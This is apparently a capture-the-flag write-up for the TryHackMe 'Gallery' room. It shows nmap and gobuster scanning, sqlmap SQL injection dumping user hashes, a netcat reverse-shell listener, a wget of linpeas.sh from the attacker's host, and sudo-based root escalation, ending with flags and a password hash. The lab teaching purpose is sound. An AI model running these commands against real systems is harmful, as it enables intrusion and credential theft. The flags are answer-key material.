---
description: https://tryhackme.com/room/gallery666
---

# Gallery

![](../../.gitbook/assets/10.10.140.229.png)

## Task 1 Deploy and get a Shell

#### How many ports are open?

```bash
nmap -n -sC -sV 10.10.140.229
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-45-35.png>)

{% hint style="success" %}
`2`
{% endhint %}

#### What's the name of the CMS?

{% hint style="success" %}
`Simple Image Gallery`
{% endhint %}

#### What's the hash password of the admin user?

```bash
gobuster dir -u http://10.10.140.229/ \
             -w /usr/share/dirb/wordlists/common.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-50-57.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-52-01.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-11-03.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-12-47.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-13-31.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-18-43.png>)

```bash
sqlmap -u 'http://10.10.140.229/gallery/?page=albums/images&id=2' -p id \
       --cookie PHPSESSID=k26eekanikq82rd185amr3kf4k --dbs
sqlmap -u 'http://10.10.140.229/gallery/?page=albums/images&id=2' -p id \
       --cookie PHPSESSID=k26eekanikq82rd185amr3kf4k --dbms MySQL \
       --technique U -D gallery_db --tables
sqlmap -u 'http://10.10.140.229/gallery/?page=albums/images&id=2' -p id \
       --cookie PHPSESSID=k26eekanikq82rd185amr3kf4k --dbms MySQL \
       --technique U -D gallery_db -T users --dump
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-24-58.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-25-10.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-29-04.png>)

{% hint style="success" %}
`a228b12a08b6527e7978cbe5d914531c`
{% endhint %}

#### What's the user flag?

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-33-03.png>)

```bash
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -type f -name user.txt 2>/dev/null
cat /home/mike/user.txt
ls -l /home/mike/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-37-18.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 19-40-15.png>)

```bash
wget http://10.6.9.176/linpeas.sh -P /tmp
bash /tmp/linpeas.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 20-06-03.png>)

```bash
cat /var/backups/mike_home_backup/.bash_history
su - mike
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 20-29-29.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 21-14-28.png>)

{% hint style="success" %}
`THM{af05cd30bfed67849befd546ef}`
{% endhint %}

## Task 2 Escalate to the root user

```bash
sudo -l
cat /opt/rootkit.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 20-30-05.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 20-30-59.png>)

```bash
export TERM=xterm
Ctrl+X
sudo /bin/bash /opt/rootkit.sh
^R /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 20-58-23.png>)

{% hint style="success" %}
`THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`
{% endhint %}

## Xmind

{% file src="../../.gitbook/assets/10.10.140.229.xmind" %}
